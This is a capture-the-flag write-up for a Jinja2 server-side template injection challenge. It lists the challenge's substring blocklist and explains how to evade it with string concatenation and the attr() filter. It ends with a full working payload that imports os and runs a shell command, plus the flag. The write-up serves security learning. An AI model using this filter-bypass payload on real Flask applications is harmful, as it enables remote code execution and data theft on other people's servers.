# Echo Chamber (Web)

## Challenge Description
A staging comment-preview service allows users to submit comment bodies for preview rendering. The application parses and renders user-supplied input dynamically on the server side using the Jinja2 templating engine. Although a custom filter is in place to screen out common malicious substrings and template injection primitives, the filter operates on the raw input template source rather than the parsed AST or runtime variables.

## Vulnerability & Analysis
1. **Server-Side Template Injection (SSTI)**:
   The endpoint `/preview` accepts a JSON payload of the form `{"body": "..."}`. The server renders the value of `body` using `render_template_string(body)`. This evaluates any Jinja2 template expressions (e.g. `{{ ... }}` or `{% ... %}`) in the context of the running Flask application.

2. **Naive Blacklist Filter**:
   The backend validates inputs using a blocklist of static substrings:
   - `config`, `self`, `request`
   - Dunder attributes/methods: `__class__`, `__base__`, `__bases__`, `__mro__`, `__subclasses__`, `__globals__`, `__builtins__`, `__import__`, `__init__`, `__dict__`
   - Critical API substrings: `os.`, `subprocess`, `popen(`, `system(`, `eval(`, `exec(`
   - Standard Jinja helper bypasses: `lipsum`, `cycler`, `joiner`, `namespace`, `application`

3. **Bypassing the Filter**:
   Because the validation performs simple substring matching on the raw template string, we can bypass the blocklist using Jinja2 string concatenation and dynamic attribute resolution via `attr()`.
   - Instead of `__class__`, we construct `'__' ~ 'class' ~ '__'`.
   - Instead of dot access `obj.attr`, we use `obj|attr('attr')`.
   - Instead of `popen(`, we decouple the attribute name lookup from the invocation: `obj|attr('popen')('command')`.
   - Instead of `os.`, we import the module dynamically using `__import__('os')` and lookup the command execution methods dynamically.

## Exploitation

1. **Locating a Python Class**:
   Starting with the Flask global object `g`, we navigate up the object hierarchy to `object` to get a list of loaded subclasses:
   - `g|attr('__' ~ 'class' ~ '__')|attr('__' ~ 'base' ~ '__')|attr('__' ~ 'subclasses' ~ '__')()`
   
   To avoid bracket indexing (which might be blocked or cause template parsing issues), we use `__getitem__`:
   - `subclasses()|attr('__' ~ 'getitem' ~ '__')(index)`

   We searched for a subclass with a non-wrapper `__init__` method (such as `warnings.catch_warnings`), which was located at index 207:
   - `{{ g|attr('__' ~ 'class' ~ '__')|attr('__' ~ 'base' ~ '__')|attr('__' ~ 'subclasses' ~ '__')()|attr('__' ~ 'getitem' ~ '__')(207) }}` → `<class 'warnings.catch_warnings'>`

2. **Accessing Built-ins & Executing Commands**:
   From `warnings.catch_warnings`, we access `__init__.__globals__.__builtins__.__import__` and import `os`:
   - `g|attr('__' ~ 'class' ~ '__')|attr('__' ~ 'base' ~ '__')|attr('__' ~ 'subclasses' ~ '__')()|attr('__' ~ 'getitem' ~ '__')(207)|attr('__' ~ 'init' ~ '__')|attr('__' ~ 'globals' ~ '__')|attr('get')('__' ~ 'builtins' ~ '__')|attr('get')('__' ~ 'import' ~ '__')('os')`
   
   We invoke `popen('cat flag.txt').read()` to execute code and retrieve the flag:
   - `...|attr('popen')('cat flag.txt')|attr('read')()`

### Full Payload
```jinja2
{{ g|attr('__' ~ 'class' ~ '__')|attr('__' ~ 'base' ~ '__')|attr('__' ~ 'subclasses' ~ '__')()|attr('__' ~ 'getitem' ~ '__')(207)|attr('__' ~ 'init' ~ '__')|attr('__' ~ 'globals' ~ '__')|attr('get')('__' ~ 'builtins' ~ '__')|attr('get')('__' ~ 'import' ~ '__')('os')|attr('popen')('cat flag.txt')|attr('read')() }}
```

## Flag
`athena{Km3QaMdF98kxo3d0}`
